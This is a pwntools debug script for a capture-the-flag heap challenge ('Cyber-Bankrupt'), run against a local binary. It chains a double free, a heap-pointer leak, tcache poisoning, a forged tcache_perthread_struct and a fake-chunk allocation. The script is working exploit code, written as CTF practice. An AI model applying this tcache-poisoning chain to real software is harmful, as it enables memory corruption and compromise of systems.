#!/usr/bin/env python3
"""Debug script to test step by step."""
from pwn import *
import sys

context.binary = ELF('/home/gluppler/Downloads/CTFs-Testing/Pwn/Medium/Cyber-Bankrupt/challenge/cyber_bankrupt')
libc = ELF('/home/gluppler/Downloads/CTFs-Testing/Pwn/Medium/Cyber-Bankrupt/challenge/glibc/libc.so.6')
context.log_level = 'debug'

BINDIR = '/home/gluppler/Downloads/CTFs-Testing/Pwn/Medium/Cyber-Bankrupt/challenge'

p = process(['./glibc/ld-linux-x86-64.so.2', '--library-path', './glibc/', './cyber_bankrupt'], cwd=BINDIR)

p.recvuntil(b'pin:')
p.sendline(b'6969')

# Step 1: Alloc
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Bank ID: ', b'0')
p.sendlineafter(b'transfer: ', b'497')  # 0x1F1
p.sendafter(b'receiver: ', b'\x00')
print(p.recvuntil(b'succeed!',timeout=5))
print("Step 1 done")

# Step 2: Free
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Bank ID: ', b'0')
print(p.recvuntil(b'out!',timeout=5))
print("Step 2 done")

# Step 3: Double-free
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Bank ID: ', b'0')
print(p.recvuntil(b'out!',timeout=5))
print("Step 3 done")

# Step 4: View
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'Bank ID: ', b'0')
leak = p.recvline()
print(f"Step 4: heap leak {leak.hex()}")

# Step 5: Poison
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Bank ID: ', b'0')
p.sendlineafter(b'transfer: ', b'497')
H = u64(leak[:8].ljust(8, b'\x00')) - 0x250
TCD = H + 0x10
print(f"H={hex(H)} TCD={hex(TCD)}")
p.sendafter(b'receiver: ', p64(TCD))
try:
    r = p.recvuntil(b'succeed!',timeout=3)
    print(f"Step 5 done: {r}")
except:
    print(f"Step 5 failed, got: {p.recv(timeout=2)}")
    p.interactive()
    sys.exit(1)

# Step 6: Alloc at tcache struct
WRITE_SZ = 0x1F0
AMOUNT = WRITE_SZ + 1
CHUNK_SZ = (AMOUNT + 0x10 + 0x0f) & ~0x0f

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Bank ID: ', b'0')
p.sendlineafter(b'transfer: ', str(AMOUNT).encode())

# Build minimal payload
payload = bytearray(WRITE_SZ)
# counts[8] = 8
payload[8] = 8
# entries[8] = TCD + 0x120 (fake chunk user data)
payload[0x40 + 8*8 : 0x40 + 8*8 + 8] = p64(TCD + 0x120)
# entries[9] = TCD (back pointer)
payload[0x40 + 9*8 : 0x40 + 9*8 + 8] = p64(TCD)
# Fake chunk size at H+0x128 = TCD + 0x118
payload[0x118 : 0x118 + 8] = p64(0x91)
# Next chunk at H+0x1B8 = TCD + 0x1A8
payload[0x1A8 : 0x1A8 + 8] = p64(0x21)
# Third chunk at H+0x1D8 = TCD + 0x1C8
payload[0x1C8 : 0x1C8 + 8] = p64(0x21)

p.sendafter(b'receiver: ', bytes(payload))
try:
    r = p.recvuntil(b'succeed!',timeout=3)
    print(f"Step 6 done: got {len(r)} bytes")
except:
    print(f"Step 6 failed, got: {p.recv(timeout=2)}")
    p.interactive()
    sys.exit(1)

# Step 7: Alloc fake chunk via entries[8] (idx 8 → request 0x80)
print("Step 7: Alloc fake chunk...")
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Bank ID: ', b'0')
p.sendlineafter(b'transfer: ', b'128')  # 0x80
p.sendafter(b'receiver: ', b'\x00')
try:
    r = p.recvuntil(b'succeed!',timeout=5)
    print(f"Step 7 done: {r}")
except:
    print(f"Step 7 FAILED. Recv: {p.recv(timeout=2)}")
    p.interactive()
    sys.exit(1)

print("All steps succeeded!")
p.close()
